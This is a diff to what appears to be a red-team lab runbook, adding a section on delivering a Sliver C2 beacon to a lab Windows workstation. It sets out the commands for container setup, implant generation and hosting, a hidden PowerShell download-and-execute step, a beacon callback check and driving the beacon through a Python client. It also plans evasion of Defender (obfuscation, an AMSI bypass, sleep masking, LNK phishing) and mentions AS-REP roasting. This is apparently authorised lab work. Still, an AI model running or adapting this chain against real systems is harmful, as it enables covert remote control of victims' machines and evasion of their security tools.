@@ -328,6 +328,148 @@ H-04 was **not** fully detonated in a browser (builder verified only). H-03 does
 
 ---
 
+## C2 Implant Delivery (Sliver via C2Stack) — Smoke Test Verified 2026-09-04
+
+The marker EXE proves delivery + execution. The next step is a **real C2 implant** (Sliver beacon) delivered through the same H-06 path, giving the operator interactive control of ws01.
+
+### Architecture
+
+```
+ws01 (192.168.77.62)          Host (192.168.77.1)              provisioning (192.168.77.60)
+  analyst_t1                     Docker Desktop                   ~/www/ :8081
+    |                              c2stack-sliver-1                   |
+    |  1. Download implant <----- :8082 (direct, smoke test) <------- implant hosted here
+    |     from provisioning :8081  :80 (redirector, needs header)     |
+    |                              :31337 (gRPC control)              |
+    |  2. Implant beacons back --> :8082 --> Sliver teamserver        |
+    |                                                              operator:
+    |  3. Operator tasks beacon --- :31337 --> sliver-client <------ on provisioning
+```
+
+### C2Stack Setup (host)
+
+```powershell
+# Start Sliver + redirector containers
+cd C:\STUDY\Github\CADRE-Platform\C2Stack\Docker
+docker compose --env-file .env up -d sliver redirector
+
+# Smoke-test override: expose Sliver HTTP :80 directly on host :8082
+# (bypasses redirector header check — see docker-compose.override.yml)
+# Production path: use redirector with custom-header implant profile
+
+# Verify
+docker ps --format "table {{.Names}}\t{{.Ports}}" | findstr sliver
+# Expected: 0.0.0.0:31337->31337/tcp, 0.0.0.0:8082->80/tcp
+```
+
+### Generate + Host Implant
+
+```bash
+# Inside the sliver container — create operator config (one-time)
+docker exec c2stack-sliver-1 sh -c '
+  export PATH=/root/.sliver/go/bin:$PATH
+  sliver-server operator new --name cadre-operator \
+    --lhost 192.168.77.1 --lport 31337 \
+    --save /tmp/cadre-operator.cfg --permissions all
+'
+
+# Copy operator config to provisioning
+docker cp c2stack-sliver-1:/tmp/cadre-operator.cfg /tmp/cadre-operator.cfg
+scp -i ~/.ssh/cadre-provisioning-key /tmp/cadre-operator.cfg \
+  vagrant@192.168.77.60:/tmp/cadre-operator.cfg
+ssh -i ~/.ssh/cadre-provisioning-key vagrant@192.168.77.60 \
+  "sliver-client import /tmp/cadre-operator.cfg"
+
+# Create HTTP listener + generate Windows beacon (inside container)
+docker exec c2stack-sliver-1 sh -c '
+  export PATH=/root/.sliver/go/bin:$PATH
+  cat > /tmp/setup.rc << "RC"
+http --lhost 0.0.0.0 --lport 80 --website cadre-http
+generate beacon --http 192.168.77.1:8082 --os windows --arch amd64 \
+  --save /tmp/cadre-implant.exe --skip-symbols
+exit
+RC
+  sliver-client console --rc /tmp/setup.rc
+'
+
+# Copy implant to provisioning ~/www
+docker cp c2stack-sliver-1:/tmp/cadre-implant.exe /tmp/cadre-implant.exe
+scp -i ~/.ssh/cadre-provisioning-key /tmp/cadre-implant.exe \
+  vagrant@192.168.77.60:~/www/cadre-implant.exe
+```
+
+### Deliver + Execute on ws01
+
+```powershell
+# On ws01 as analyst_t1 — download from provisioning :8081
+Invoke-WebRequest -Uri http://192.168.77.60:8081/cadre-implant.exe `
+  -OutFile C:\Users\analyst_t1\Downloads\cadre-implant.exe -UseBasicParsing
+
+# Execute (background, hidden)
+Start-Process -FilePath C:\Users\analyst_t1\Downloads\cadre-implant.exe `
+  -WindowStyle Hidden
+```
+
+### Verify Beacon Callback
+
+```bash
+# On the sliver container — check for beacons
+docker exec c2stack-sliver-1 sh -c '
+  export PATH=/root/.sliver/go/bin:$PATH
+  cat > /tmp/check.rc << "RC"
+beacons
+exit
+RC
+  sliver-client console --rc /tmp/check.rc
+'
+# Expected: beacon with Hostname=ws01, Username=CHILD\analyst_t1, Transport=http(s)
+```
+
+### Smoke Test Result (2026-09-04)
+
+| Step | Status | Detail |
+|------|--------|--------|
+| C2Stack Sliver container up | ✅ | `c2stack-sliver-1` on host `192.168.77.1:31337` + `:8082` |
+| HTTP listener created | ✅ | Sliver HTTP :80 inside container, exposed as `:8082` on host |
+| Operator config generated | ✅ | `cadre-operator.cfg` imported on provisioning `sliver-client` |
+| Implant generated | ✅ | `cadre-implant.exe` (23.7MB, Windows amd64 beacon, `--skip-symbols`) |
+| Implant hosted on provisioning | ✅ | `~/www/cadre-implant.exe` served via `:8081` |
+| Implant downloaded on ws01 | ✅ | `C:\Users\analyst_t1\Downloads\cadre-implant.exe` (23.7MB) |
+| Implant executed on ws01 | ✅ | PID 1192, process started as `CHILD\analyst_t1` |
+| **Beacon callback received** | ✅ | Beacon `961b4851` (STRONG_PEAR) checked in from ws01 |
+| **MDE killed implant** | ⚠️ | MDE P2 terminated the process after first check-in (~60s) |
+| Task execution (`whoami`) | ❌ | Beacon killed before second check-in to retrieve task result |
+
+**Key finding:** MDE P2 detected and killed the unobfuscated Sliver beacon (`--skip-symbols`) after the first callback. The beacon successfully checked in once (proving the full C2 chain works), but MDE terminated it before the second check-in could retrieve the queued `whoami` task.
+
+**Next steps for production C2 path:**
+1. **Obfuscation:** Generate with symbol obfuscation (remove `--skip-symbols`) to extend beacon lifetime
+2. **Redirector header support:** Use Sliver implant profiles to embed the `X-Request-ID: cadre-c2` header, enabling the redirector path (`:80/cloud/storage/objects`) instead of the direct `:8082` bypass
+3. **AMSI/ETR bypass:** Pre-stage an AMSI bypass or use Sliver's `--evasion` flags
+4. **Sleep masking:** Use Sliver's sleep mask to reduce in-memory detection
+5. **Delivery via H-01 LNK:** Wrap the implant in the existing LNK delivery vector for a realistic phishing-to-C2 chain
+
+### RedStrike C2 Integration
+
+RedStrike's `SliverClient` (`redstrike/c2/sliver.py`) can drive the beacon once it's alive:
+
+```python
+from redstrike.c2 import get_c2_client, C2Backend
+
+client = get_c2_client(C2Backend.SLIVER, endpoint="192.168.77.1:31337")
+sessions = client.list_sessions()  # or beacons
+result = client.shell(session_id, "whoami")
+```
+
+Or via CLI:
+```bash
+# On provisioning
+python -m redstrike.cli campaign --c2 --c2-backend sliver \
+  --c2-session 961b4851 --c2-endpoint 192.168.77.1:31337
+```
+
+---
+
 ## Phase 0.5 → Phase 1 Transition
 
 From the ws01 beachhead as `analyst_t1`, the attacker performs lightweight domain reconnaissance. This reveals the `intern_blue` account in `child.cadre.local` with `DONT_REQUIRE_PREAUTH`. The attacker then pivots to Phase 1 — AS-REP roasting `intern_blue` from the ws01 beachhead.
